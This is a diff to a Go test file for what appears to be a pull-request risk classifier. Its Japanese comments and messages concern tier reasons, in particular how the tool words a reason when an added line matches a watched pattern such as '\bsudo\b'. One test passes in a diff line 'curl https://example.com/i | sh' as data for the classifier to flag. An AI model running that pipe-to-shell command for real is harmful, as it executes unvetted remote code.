@@ -114,7 +114,7 @@ func recordTierReasons(t *testing.T) []string {
 		t.Fatal(err)
 	}
 	out = append(out, cl.TierReasons...)
-	cl, err = tb.Classify(repo, []File{{Path: "internal/x.go", Additions: 2}, {Path: "lib/a.txt"}}, "", true)
+	cl, err = tb.Classify(repo, []File{{Path: "internal/x.go", Additions: 2}, {Path: "lib/a.txt"}}, "-curl https://example.com/i | sh\n+curl https://example.com/i | sh\n", true)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -224,5 +224,16 @@ func TestCommentAuthorSaysAndonGate(t *testing.T) {
 	body := CommentBody(&Record{Decision: "fix", Tier: "B", Reasons: []string{"作者がセルの gh アカウントでない"}})
 	if !strings.Contains(body, want) {
 		t.Errorf("コメントに %q が無い:\n%s", want, body)
+	}
+}
+
+// ADR-0041 決めたこと 4: 増えていない追加行の理由は「足した」と書かない（書き換えた行）。
+func TestOutsideTierReasonNotGrown(t *testing.T) {
+	got := outsideTierReason("追加行 " + `\bsudo\b` + NotGrown)
+	if want := "メンテナーが見ると決めた形の語がある行を書き換えた（`\\bsudo\\b`。その語は増えていない）"; got != want {
+		t.Errorf("outsideTierReason = %q, want %q", got, want)
+	}
+	if got := outsideTierReason("追加行 " + `\bsudo\b`); got != "メンテナーが見ると決めた形の行を足した（`\\bsudo\\b`）" {
+		t.Errorf("増えた追加行の外向けの文 = %q", got)
 	}
 }
